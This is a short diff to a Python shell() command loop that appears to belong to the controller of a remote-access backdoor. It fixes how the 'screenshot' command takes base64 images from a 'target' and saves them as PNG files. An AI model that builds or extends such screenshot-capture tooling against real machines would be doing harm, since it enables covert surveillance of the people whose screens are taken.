@@ -53,16 +53,16 @@ def shell():
         
         # Screenshot bot monitor
         elif command[:10] == "screenshot":
-            with open(f"screenshot-{count}", "wb") as f:
+            with open(f"screenshot-{count}.png", "wb") as f:
                 image = reliable_recv()
                 
                 image_decoded = base64.b64decode(image)
 
-                # if image[:3] == "[-]":
-                print(image_decoded)
-                # else:
-                #     f.write(image_decoded)
-                count += 1
+                if image[:3] == "[-]":
+                    print(image_decoded)
+                else:
+                    f.write(image_decoded)
+                    count += 1
         else:
             # result = target.recv(1024) # data type Bytes
             result = reliable_recv() # need decode??? --> nope, already decode in the function
